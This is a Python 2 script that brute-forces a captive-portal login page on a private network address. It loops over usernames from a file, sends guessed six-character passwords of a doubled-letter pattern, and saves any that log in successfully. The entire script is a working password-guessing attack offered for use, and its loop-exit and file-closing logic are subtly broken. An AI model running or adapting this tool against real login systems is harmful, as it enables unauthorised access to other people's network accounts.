from urllib import urlencode
from urllib2 import urlopen
from os import system, devnull, path
import subprocess
import signal
import time
from sys import argv, exit
from time import sleep
import httplib
from json import load
samplespace="67890rstuvwxyzabcdefghijklmnopq12345"
a=0
b=0
c=0

# For periodic checking of login status
SLEEP_TIME = 200

BASE_URL = "http://172.16.68.6:8090/login.xml"

BROWSERS_DICT = {"0": "", "1": "firefox", "2": "google-chrome"}


def send_request(request_type, *arg):
    if(request_type == 'login'):
        
        params = urlencode(
            {'mode': 191, 'username': arg[0], 'password': arg[1]})
    elif(request_type == 'logout'):
        print "Initiating logout request.."
        params = urlencode({'mode': 193, 'username': arg[0]})

    response = urlopen(BASE_URL, params)
    return response.read()

if __name__ == "__main__":
    if "bruteforce" in argv:
        with open('username.txt') as openfileobject:
            for line in openfileobject:
                line=line[:-1]
                a=0
                b=0
                c=0
                print line 
                for a in range(0,35):
                    for b in range (0,35):
                        for c in range (0,35):
                            p=samplespace[a]+samplespace[a]+samplespace[b]+samplespace[b]+samplespace[c]+samplespace[c]
                            data = send_request("login", line, p)
                            print p
                            if not "could not" in data:
                                fo= open('password.txt','w+')
                                fo.write(p+line)
                                fo.close()
                                print "Found password" + p + line
                                a=37
                                b=37
                                c=37
        fo.close()

                            
                
                
